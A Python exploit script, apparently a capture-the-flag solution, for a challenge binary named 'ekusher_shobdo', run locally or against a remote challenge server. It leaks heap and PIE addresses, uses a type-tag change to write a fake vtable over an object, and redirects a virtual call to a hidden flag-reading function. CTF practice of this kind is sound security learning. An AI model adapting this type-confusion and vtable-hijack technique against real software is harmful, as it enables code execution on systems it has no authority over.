#!/usr/bin/env python3
"""Exploit for ekusher_shobdo (local or remote), using only Python stdlib."""

from __future__ import annotations

import argparse
import os
import re
import select
import socket
import struct
import subprocess
import sys
import time
from pathlib import Path

POEM_VTABLE_OFFSET = 0x4C08
WIN_OFFSET = 0x1DD0
MENU_PROMPT = b"> "


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


class Tube:
    def recv(self, size: int = 4096, timeout: float = 5.0) -> bytes:
        raise NotImplementedError

    def send(self, data: bytes) -> None:
        raise NotImplementedError

    def sendline(self, data: bytes | str = b"") -> None:
        if isinstance(data, str):
            data = data.encode()
        self.send(data + b"\n")

    def recvuntil(self, marker: bytes, timeout: float = 5.0) -> bytes:
        buf = bytearray()
        deadline = time.monotonic() + timeout
        while marker not in buf:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(
                    f"Timed out waiting for {marker!r}; received tail={bytes(buf[-400:])!r}"
                )
            chunk = self.recv(timeout=remaining)
            if not chunk:
                break
            buf.extend(chunk)
        return bytes(buf)

    def close(self) -> None:
        pass


class LocalTube(Tube):
    def __init__(self, binary: str):
        binary_path = Path(binary).resolve()
        self.proc = subprocess.Popen(
            [str(binary_path)],
            cwd=str(binary_path.parent),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            bufsize=0,
        )
        if self.proc.stdin is None or self.proc.stdout is None:
            raise RuntimeError("Could not open subprocess pipes")

    def recv(self, size: int = 4096, timeout: float = 5.0) -> bytes:
        assert self.proc.stdout is not None
        ready, _, _ = select.select([self.proc.stdout], [], [], timeout)
        if not ready:
            return b""
        return os.read(self.proc.stdout.fileno(), size)

    def send(self, data: bytes) -> None:
        assert self.proc.stdin is not None
        self.proc.stdin.write(data)
        self.proc.stdin.flush()

    def close(self) -> None:
        if self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=0.5)
            except subprocess.TimeoutExpired:
                self.proc.kill()


class RemoteTube(Tube):
    def __init__(self, host: str, port: int):
        self.sock = socket.create_connection((host, port), timeout=8.0)

    def recv(self, size: int = 4096, timeout: float = 5.0) -> bytes:
        self.sock.settimeout(timeout)
        try:
            return self.sock.recv(size)
        except socket.timeout:
            return b""

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def close(self) -> None:
        self.sock.close()


def choose(io: Tube, option: int) -> bytes:
    io.sendline(str(option))
    return b""


def solve(io: Tube, verbose: bool = True) -> bytes:
    transcript = bytearray()

    def ru(marker: bytes, timeout: float = 5.0) -> bytes:
        data = io.recvuntil(marker, timeout=timeout)
        transcript.extend(data)
        return data

    # 1) Create a Poem object in slot 0.
    ru(MENU_PROMPT)
    choose(io, 1)
    ru(b"Type: ")
    io.sendline("1")
    ru(MENU_PROMPT)

    # 2) Leak heap object address and original Poem vtable address.
    choose(io, 5)
    ru(b"Record: ")
    io.sendline("0")
    leak = ru(MENU_PROMPT)

    storage_match = re.search(rb"storage=(0x[0-9a-fA-F]+)", leak)
    dispatch_match = re.search(rb"dispatch=(0x[0-9a-fA-F]+)", leak)
    if not storage_match or not dispatch_match:
        raise RuntimeError(f"Could not parse metadata leak: {leak!r}")

    storage = int(storage_match.group(1), 16)
    dispatch = int(dispatch_match.group(1), 16)
    pie_base = dispatch - POEM_VTABLE_OFFSET
    win = pie_base + WIN_OFFSET
    fake_vtable = storage + 8

    if verbose:
        print(f"[+] storage     = {storage:#x}")
        print(f"[+] dispatch    = {dispatch:#x}")
        print(f"[+] PIE base    = {pie_base:#x}")
        print(f"[+] win         = {win:#x}")
        print(f"[+] fake vtable = {fake_vtable:#x}")

    # 3) Change only the external type tag to IMPORTED.
    choose(io, 3)
    ru(b"Record: ")
    io.sendline("0")
    ru(b"New classification: ")
    io.sendline("5")
    ru(MENU_PROMPT)

    # 4) Imported editor decodes up to 0xa0 raw bytes directly over the object.
    #    object[0]  = pointer to fake vtable at object+8
    #    object[8]  = fake virtual method #0 (unused)
    #    object[16] = fake virtual method #1 -> hidden flag-reading function
    payload = p64(fake_vtable) + p64(0) + p64(win)

    choose(io, 2)
    ru(b"Record: ")
    io.sendline("0")
    ru(b"Raw bytes (hex): ")
    io.sendline(payload.hex())
    ru(MENU_PROMPT)

    # 5) Publish calls vtable[1], now redirected to win().
    choose(io, 6)
    ru(b"Record: ")
    io.sendline("0")
    result = ru(MENU_PROMPT, timeout=8.0)

    flag_match = re.search(rb"(?:BDSEC|FLAG|CTF)\{[^\r\n}]+\}", result, re.I)
    if flag_match:
        print(f"[+] Flag: {flag_match.group(0).decode(errors='replace')}")
    else:
        print(result.decode(errors="replace"), end="")
        print("[-] Exploit ran, but no standard-format flag was found.")

    return result


def main() -> int:
    parser = argparse.ArgumentParser(description="Solve ekusher_shobdo locally or remotely")
    sub = parser.add_subparsers(dest="mode", required=True)

    local = sub.add_parser("local", help="run the uploaded ELF locally")
    local.add_argument("binary", nargs="?", default="/mnt/data/ekusher_shobdo")

    remote = sub.add_parser("remote", help="connect to the challenge server")
    remote.add_argument("host")
    remote.add_argument("port", type=int)

    args = parser.parse_args()
    io: Tube
    if args.mode == "local":
        io = LocalTube(args.binary)
    else:
        io = RemoteTube(args.host, args.port)

    try:
        solve(io)
        return 0
    finally:
        io.close()


if __name__ == "__main__":
    sys.exit(main())
